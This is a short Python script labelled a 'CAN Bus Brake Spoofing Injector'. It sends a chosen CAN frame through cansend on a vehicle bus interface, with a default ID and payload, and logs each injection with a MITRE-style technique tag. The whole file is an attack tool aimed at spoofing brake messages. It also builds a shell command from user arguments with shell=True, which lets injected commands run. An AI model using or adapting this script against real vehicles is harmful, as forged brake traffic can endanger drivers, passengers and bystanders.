#!/usr/bin/env python3

import argparse
import os
import json
import time
from datetime import datetime
import subprocess

LOG_FILE = "results/can_injection_log.json"
MITRE_TTP = "T874.001"

def log(entry):
    os.makedirs("results", exist_ok=True)
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    except:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def inject_can_frame(iface, can_id, data):
    cmd = f"cansend {iface} {can_id}#{data}"
    subprocess.run(cmd, shell=True)

def main():
    parser = argparse.ArgumentParser(description="CAN Bus Brake Spoofing Injector")
    parser.add_argument("--iface", default="can0", help="CAN interface")
    parser.add_argument("--id", default="18FF50E5", help="CAN ID")
    parser.add_argument("--data", default="FF00000000000000", help="CAN data payload (hex)")
    args = parser.parse_args()

    inject_can_frame(args.iface, args.id, args.data)
    log({
        "timestamp": datetime.utcnow().isoformat(),
        "iface": args.iface,
        "id": args.id,
        "data": args.data,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
